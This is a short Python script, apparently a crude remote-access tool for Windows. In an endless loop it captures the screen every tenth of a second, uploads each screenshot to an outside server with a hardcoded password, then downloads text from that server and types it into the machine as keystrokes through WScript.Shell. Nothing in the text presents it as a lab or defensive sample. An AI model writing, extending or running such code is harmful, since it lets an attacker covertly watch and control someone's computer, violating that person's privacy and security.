import requests
from mss import mss
import time
import win32com.client


def upload(wait):
    assert type(wait) == float or int, "wait time must be int or float"
    time.sleep(wait)
    screen = mss()
    screen.shot(output="screenshot.png")
    r = requests.post("https://expected.ga/badia/upload.php", files={"fileToUpload": open("screenshot.png","rb")}, data={"submit":"bruh", "passwd": "bruhmoment"})
    print(r.text)
    r2 = requests.get("https://expected.ga/badia/do.txt")
    key = r2.text
    print(key)
    if not key == "":
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys(key)
        time.sleep(1)
        

while True:
    upload(0.1)
